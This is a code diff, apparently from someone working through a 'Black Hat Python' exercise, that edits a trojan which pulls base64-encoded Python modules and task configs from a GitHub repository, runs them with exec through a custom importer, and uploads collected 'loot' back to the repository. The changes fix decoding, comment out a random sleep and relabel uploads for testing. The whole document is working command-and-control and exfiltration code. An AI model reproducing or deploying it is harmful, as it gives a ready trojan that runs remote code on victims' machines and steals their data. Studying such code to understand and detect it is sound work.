@@ -28,7 +28,7 @@ class Importer():
         self.current_module_code = ""
 
     def FindModule(self, name, path=None):
-        new_module_code = GetFile(path + "/" + name + ".py")
+        new_module_code = base64.b64decode(GetFile(path + "/" + name + ".py"))
         #new_module_code = ReadFile(path + "/" + name + ".py")
 
         return self.VerifyModule(new_module_code)
@@ -45,32 +45,6 @@ class Importer():
         module = imp.new_module(name)
         exec(self.current_module_code, module.__dict__)
         sys.modules[name] = module        
-"""
-class Task(object):
-    def __init__(self, task_name, task_args):
-        self.task_name = task_name
-        self.task_args = task_args
-        self.task_thread = None
-
-    def __hash__(self):
-        return hash((self.task_name, "".join(self.task_args) ))
-
-    def __eq__(self, other):
-        if not isinstance(other, type(self)):
-            return False
-
-        return (self.task_name == other.task_name) and (self.task_args == other.task_args) #and (self.task_thread == other.task_thread)
-
-    def __contains__(self, other):        flag = False
-        for task_instance in other:
-            if(self == task_instance):
-                return True
-
-        return False              
-
-    def InitThread(self):
-        self.task_thread = threading.Thread(target=RunModule, args=(self.task_name, self.task_args,))
-"""
 
 class Task(object):
     def __init__(self, task_name, task_args):
@@ -161,8 +135,8 @@ def GetFile(dir):
     gh, repo  = ConnectToGithub()
     print("Downloading: %s" % dir)
     f = repo.file_contents(dir)
-    
-    return f
+
+    return f.content
 
 def GetConfig():
     global CONFIG
@@ -173,7 +147,7 @@ def GetConfig():
     while True:
         print("Attempting to receive taskset...")
         
-        config = loads(base64.b64decode(GetFile(CONFIG_DIR)).content) #simplejson, base64 used
+        config = loads(base64.b64decode(GetFile(CONFIG_DIR))) #simplejson, base64 used
         #config = loads(ReadFile("/home/dks/Development/Python/blackhat-python/" + CONFIG_DIR))
         if(CONFIG != config):
             CONFIG = config
@@ -201,14 +175,16 @@ def GetConfig():
         else:
             print("No new task added...")
 
-        sleep(random.randint(10,20))
+        #sleep(random.randint(10,20))
             
 def StoreLoot(loot):
     global LOOT_NUM
     
     gh, repo = ConnectToGithub()
-    remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
-    repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
+    remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, "testing")
+    #remote_path = "%s/%d-%s.txt" % (LOOT_DIR, LOOT_NUM, datetime.time.strftime("%H%M"))
+    #repo.create_file(remote_path, datetime.date.strftime("%Y-%m-%d"), base64.b64encode(loot))
+    repo.create_file( remote_path, "testing...03/05", base64.b64encode(str(loot)) )
     LOOT_NUM += 1
 
     return
